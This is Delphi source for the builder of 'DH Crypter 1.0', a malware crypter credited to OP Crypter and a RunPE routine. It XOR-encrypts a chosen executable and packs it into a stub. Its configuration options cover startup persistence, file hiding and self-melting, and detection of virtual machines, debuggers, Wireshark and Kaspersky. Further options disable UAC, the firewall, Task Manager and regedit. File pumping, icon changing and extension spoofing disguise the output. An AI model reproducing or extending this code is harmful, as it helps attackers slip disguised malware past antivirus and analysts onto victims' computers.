// DH Crypter 1.0
// (C) Doddy Hackman 2015
// Credits :
// DH Crypter based in OP Crypter By Xash
// RunPE [uExecFromMem] made by steve10120
// Thanks to Xash and steve10120

unit builder_now;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, sSkinManager, ComCtrls, sStatusBar, sPageControl, StdCtrls,
  sButton, sEdit, sGroupBox, sCheckBox, sComboBox, sUpDown, sRadioButton,
  ExtCtrls, ShellApi, auxiliar_tools, tools, acPNG, sLabel;

type
  TForm1 = class(TForm)
    skin: TsSkinManager;
    sPageControl1: TsPageControl;
    sTabSheet1: TsTabSheet;
    sGroupBox1: TsGroupBox;
    filename: TsEdit;
    load: TsButton;
    sGroupBox2: TsGroupBox;
    clave: TsEdit;
    generate: TsButton;
    encrypt: TsButton;
    sTabSheet3: TsTabSheet;
    sPageControl2: TsPageControl;
    sTabSheet4: TsTabSheet;
    sTabSheet5: TsTabSheet;
    sGroupBox4: TsGroupBox;
    delay: TsCheckBox;
    delay_time: TsEdit;
    startup: TsCheckBox;
    hide_file: TsCheckBox;
    sTabSheet2: TsTabSheet;
    sTabSheet6: TsTabSheet;
    sGroupBox3: TsGroupBox;
    title: TsEdit;
    sGroupBox5: TsGroupBox;
    message_text: TsEdit;
    sGroupBox6: TsGroupBox;
    type_message: TsComboBox;
    message_box: TsCheckBox;
    sGroupBox7: TsGroupBox;
    execute_this_command: TsCheckBox;
    command: TsEdit;
    sGroupBox8: TsGroupBox;
    kill_this_process: TsCheckBox;
    process: TsEdit;
    sTabSheet7: TsTabSheet;
    sGroupBox9: TsGroupBox;
    open_this_url: TsCheckBox;
    url: TsEdit;
    sGroupBox10: TsGroupBox;
    download_this_file: TsCheckBox;
    file_to_download: TsEdit;
    sTabSheet8: TsTabSheet;
    sTabSheet9: TsTabSheet;
    sTabSheet10: TsTabSheet;
    use_file_pumper: TsCheckBox;
    sGroupBox11: TsGroupBox;
    count: TsEdit;
    sUpDown1: TsUpDown;
    sGroupBox12: TsGroupBox;
    types_pumper: TsComboBox;
    use_extension_spoofer: TsCheckBox;
    sGroupBox13: TsGroupBox;
    select_extension: TsRadioButton;
    use_this_extension: TsRadioButton;
    extension: TsEdit;
    extensions: TsComboBox;
    sGroupBox14: TsGroupBox;
    ruta_icono: TsEdit;
    otro_load: TsButton;
    sGroupBox15: TsGroupBox;
    use_icon_changer: TsCheckBox;
    archivo: TOpenDialog;
    preview: TImage;
    sTabSheet11: TsTabSheet;
    sGroupBox16: TsGroupBox;
    sGroupBox17: TsGroupBox;
    virtual_pc: TsCheckBox;
    virtual_box: TsCheckBox;
    debug: TsCheckBox;
    wireshark: TsCheckBox;
    ollydbg: TsCheckBox;
    anubis: TsCheckBox;
    kaspersky: TsCheckBox;
    vmware: TsCheckBox;
    uac: TsCheckBox;
    firewall: TsCheckBox;
    cmd: TsCheckBox;
    run: TsCheckBox;
    taskmgr: TsCheckBox;
    regedit: TsCheckBox;
    updates: TsCheckBox;
    melt: TsCheckBox;
    status: TsStatusBar;
    sGroupBox18: TsGroupBox;
    about: TImage;
    sLabel1: TsLabel;
    logo: TImage;
    procedure loadClick(Sender: TObject);
    procedure otro_loadClick(Sender: TObject);
    procedure generateClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure encryptClick(Sender: TObject);
  private
    procedure DragDropFile(var Msg: TMessage); message WM_DROPFILES;
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Functions

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

procedure TForm1.DragDropFile(var Msg: TMessage);
var
  numero2: integer;
  numero1: integer;
  ruta: array [0 .. MAX_COMPUTERNAME_LENGTH + MAX_PATH] of Char;
begin
  numero2 := DragQueryFile(Msg.WParam, $FFFFFFFF, ruta, 255) - 1;
  for numero1 := 0 to numero2 do
  begin
    DragQueryFile(Msg.WParam, numero1, ruta, 255);
    if (ExtractFileExt(ruta) = '.exe') then
    begin
      filename.Text := ruta;
    end
    else
    begin
      ShowMessage('');
    end;
  end;
  DragFinish(Msg.WParam);
end;

function generate_numbers(limit: integer): string;
var
  i: integer;
  numbers: string;
  num: integer;
begin

  for i := 1 to limit do
  begin
    num := Random(9) + 1;
    numbers := numbers + IntToStr(num);
  end;
  Result := numbers;
end;

procedure TForm1.loadClick(Sender: TObject);
begin
  archivo.InitialDir := GetCurrentDir;
  archivo.Filter := 'EXE|*.exe|';

  if archivo.Execute then
  begin
    filename.Text := archivo.filename;
  end;
end;

procedure TForm1.otro_loadClick(Sender: TObject);
begin
  archivo.InitialDir := GetCurrentDir;
  archivo.Filter := 'ICO|*.ico|';

  if archivo.Execute then
  begin
    preview.Picture.LoadFromFile(archivo.filename);
    ruta_icono.Text := archivo.filename;
  end;
end;

procedure TForm1.generateClick(Sender: TObject);
begin
  clave.Text := generate_numbers(10);
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  DragAcceptFiles(Handle, True);
end;

procedure TForm1.encryptClick(Sender: TObject);
var
  linea: string;
  op_delay, op_delay_time, op_startup, op_hide, op_melt: string;
  op_message, op_message_title, op_message_text, op_message_type: string;
  op_execute_this_command, op_command, op_kill_this_process, op_process: string;
  op_open_this_url, op_url, op_download_this_file, op_file_to_download: string;

var
  op_virtual_pc: string;
  op_virtual_box: string;
  op_debug: string;
  op_wireshark: string;
  op_ollydbg: string;
  op_anubis: string;
  op_kaspersky: string;
  op_vmware: string;
  op_uac: string;
  op_firewall: string;
  op_cmd: string;
  op_run: string;
  op_taskmgr: string;
  op_regedit: string;
  op_updates: string;

var
  codigo: String;
  datos: string;
  key: integer;
  separador: string;
  stub_generado: string;

begin

  if (clave.Text = '') then
  begin
    MessageBox(0, 'Generate key', 'DH Crypter 1.0', MB_ICONINFORMATION);
  end
  else
  begin
    if (FileExists(filename.Text)) then
    begin
      if (delay.Checked) then
      begin
        op_delay := '1';
      end
      else
      begin
        op_delay := '0';
      end;

      if (startup.Checked) then
      begin
        op_startup := '1';
      end
      else
      begin
        op_startup := '0';
      end;

      if (hide_file.Checked) then
      begin
        op_hide := '1';
      end
      else
      begin
        op_hide := '0';
      end;

      if (melt.Checked) then
      begin
        op_melt := '1';
      end
      else
      begin
        op_melt := '0';
      end;

      if (message_box.Checked) then
      begin
        op_message := '1';
      end
      else
      begin
        op_message := '0';
      end;

      if (execute_this_command.Checked) then
      begin
        op_execute_this_command := '1';
      end
      else
      begin
        op_execute_this_command := '0';
      end;

      if (kill_this_process.Checked) then
      begin
        op_kill_this_process := '1';
      end
      else
      begin
        op_kill_this_process := '0';
      end;

      if (open_this_url.Checked) then
      begin
        op_open_this_url := '1';
      end
      else
      begin
        op_open_this_url := '0';
      end;

      if (download_this_file.Checked) then
      begin
        op_download_this_file := '1';
      end
      else
      begin
        op_download_this_file := '0';
      end;

      if (virtual_pc.Checked) then
      begin
        op_virtual_pc := '1';
      end
      else
      begin
        op_virtual_pc := '0';
      end;

      if (virtual_box.Checked) then
      begin
        op_virtual_box := '1';
      end
      else
      begin
        op_virtual_box := '0';
      end;

      if (debug.Checked) then
      begin
        op_debug := '1';
      end
      else
      begin
        op_debug := '0';
      end;

      if (wireshark.Checked) then
      begin
        op_wireshark := '1';
      end
      else
      begin
        op_wireshark := '0';
      end;

      if (ollydbg.Checked) then
      begin
        op_ollydbg := '1';
      end
      else
      begin
        op_ollydbg := '0';
      end;

      if (anubis.Checked) then
      begin
        op_anubis := '1';
      end
      else
      begin
        op_anubis := '0';
      end;

      if (kaspersky.Checked) then
      begin
        op_kaspersky := '1';
      end
      else
      begin
        op_kaspersky := '0';
      end;

      if (vmware.Checked) then
      begin
        op_vmware := '1';
      end
      else
      begin
        op_vmware := '0';
      end;

      if (uac.Checked) then
      begin
        op_uac := '1';
      end
      else
      begin
        op_uac := '0';
      end;

      if (firewall.Checked) then
      begin
        op_firewall := '1';
      end
      else
      begin
        op_firewall := '0';
      end;

      if (cmd.Checked) then
      begin
        op_cmd := '1';
      end
      else
      begin
        op_cmd := '0';
      end;

      if (run.Checked) then
      begin
        op_run := '1';
      end
      else
      begin
        op_run := '0';
      end;

      if (taskmgr.Checked) then
      begin
        op_taskmgr := '1';
      end
      else
      begin
        op_taskmgr := '0';
      end;

      if (regedit.Checked) then
      begin
        op_regedit := '1';
      end
      else
      begin
        op_regedit := '0';
      end;

      if (updates.Checked) then
      begin
        op_updates := '1';
      end
      else
      begin
        op_updates := '0';
      end;

      stub_generado := 'done.exe';
      op_message_title := title.Text;
      op_message_text := message_text.Text;
      op_message_type := type_message.Text;
      op_command := command.Text;
      op_process := process.Text;
      op_url := url.Text;
      op_file_to_download := file_to_download.Text;

      linea := '[op_delay]' + op_delay + '[op_delay]' + '[op_delay_time]' +
        op_delay_time + '[op_delay_time]' + '[op_startup]' + op_startup +
        '[op_startup]' + '[op_hide]' + op_hide + '[op_hide]' + '[op_melt]' +
        op_melt + '[op_melt]';

      linea := linea + '[op_message]' + op_message + '[op_message]' +
        '[op_message_title]' + op_message_title + '[op_message_title]' +
        '[op_message_text]' + op_message_text + '[op_message_text]' +
        '[op_message_type]' + op_message_type + '[op_message_type]';

      linea := linea + '[op_execute_this_command]' + op_execute_this_command +
        '[op_execute_this_command]' + '[op_command]' + op_command +
        '[op_command]' + '[op_kill_this_process]' + op_kill_this_process +
        '[op_kill_this_process][op_process]' + op_process + '[op_process]';

      linea := linea + '[op_open_this_url]' + op_open_this_url +
        '[op_open_this_url]' + '[op_url]' + op_url + '[op_url]' +
        '[op_download_this_file]' + op_download_this_file +
        '[op_download_this_file]' + '[op_file_to_download]' +
        op_file_to_download + '[op_file_to_download]';

      linea := linea + '[op_virtual_pc]' + op_virtual_pc + '[op_virtual_pc]' +
        '[op_virtual_box]' + op_virtual_box + '[op_virtual_box]' + '[op_debug]'
        + op_debug + '[op_debug]' + '[op_wireshark]' + op_wireshark +
        '[op_wireshark]' + '[op_ollydbg]' + op_ollydbg + '[op_ollydbg]' +
        '[op_anubis]' + op_anubis + '[op_anubis]' + '[op_kaspersky]' +
        op_kaspersky + '[op_kaspersky]' + '[op_vmware]' + op_vmware +
        '[op_vmware]';

      linea := linea + '[op_uac]' + op_uac + '[op_uac]' + '[op_firewall]' +
        op_firewall + '[op_firewall]' + '[op_cmd]' + op_cmd + '[op_cmd]' +
        '[op_run]' + op_run + '[op_run]' + '[op_taskmgr]' + op_taskmgr +
        '[op_taskmgr]' + '[op_regedit]' + op_regedit + '[op_regedit]' +
        '[op_updates]' + op_updates + '[op_updates]';

      separador := '0x2D64685F736570617261646F722D';
      key := StrToInt(clave.Text);

      datos := xor_now(linea, key);

      codigo := xor_now(leer_archivo(filename.Text), key);

      CopyFile(Pchar(ExtractFilePath(Application.ExeName) + '/Data/' +
        'stub.exe'), Pchar(ExtractFilePath(Application.ExeName) + '/' +
        stub_generado), True);

      linea := separador + codigo + separador + dhencode(IntToStr(key),
        'encode') + separador + datos + separador;

      escribir_datos(stub_generado, '0x64685F626C6F71756531',
        '0x64685F626C6F71756532', linea);

      if (use_file_pumper.Checked) then
      begin
        if (file_pumper(stub_generado, count.Text, types_pumper.Text)) then
        begin
          status.Panels[0].Text := '[+] File Pumper';
          status.Update;
        end
        else
        begin
          status.Panels[0].Text := '[-] Error with File Pumper';
          status.Update;
        end;
      end;

      if (use_icon_changer.Checked) then
      begin
        if (change_icon(stub_generado, ruta_icono.Text)) then
        begin
          status.Panels[0].Text := '[+] Icon Changed';
          status.Update;
        end
        else
        begin
          status.Panels[0].Text := '[-] Error with Icon Changer';
          status.Update;
        end;
      end;

      if (use_extension_spoofer.Checked) then
      begin
        if (select_extension.Checked) then
        begin
          if (extension_changer(stub_generado, extensions.Text)) then
          begin
            status.Panels[0].Text := '[+] Extension Changed';
            status.Update;
          end
          else
          begin
            status.Panels[0].Text := '[-] Error with Extension Changer';
            status.Update;
          end;
        end;
        if (use_this_extension.Checked) then
        begin
          if (extension_changer(stub_generado, extension.Text)) then
          begin
            status.Panels[0].Text := '[+] Extension Changed';
            status.Update;
          end
          else
          begin
            status.Panels[0].Text := '[-] Error with Extension Changer';
            status.Update;
          end;
        end;
      end;

      status.Panels[0].Text := '[+] Done';
      status.Update;

      MessageBox(0, 'Stub Generated', 'DH Crypter 1.0', MB_ICONINFORMATION);

    end
    else
    begin
      MessageBox(0, 'Select file to encrypt', 'DH Crypter 1.0',
        MB_ICONINFORMATION);
    end;
  end;

end;

end.

// The End ?
